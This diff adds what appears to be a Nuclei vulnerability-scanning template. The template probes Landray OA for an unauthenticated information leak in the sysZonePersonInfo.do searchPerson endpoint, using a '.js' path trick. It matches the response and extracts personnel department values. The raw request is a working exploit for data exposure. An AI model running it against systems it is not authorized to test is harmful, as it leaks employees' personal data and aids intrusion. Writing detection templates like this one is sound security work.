@@ -1,0 +1,38 @@
+id: landray-sysZonePersonInfo-infoleak
+
+info:
+  name: landray-sysZonePersonInfo-infoleak
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=20&s_ajax=true HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+        Accept-Encoding: gzip
+        Connection: close
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"columns","title","property")
+
+
+    # extractors:
+    #   - type: regex
+    #     part: body_1
+    #     group: 1
+    #     regex:
+    #       - \{"col":"fdDept","value":"([^"]*)"\}
+
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - .datas[][] | select(.col == "fdDept") | .value
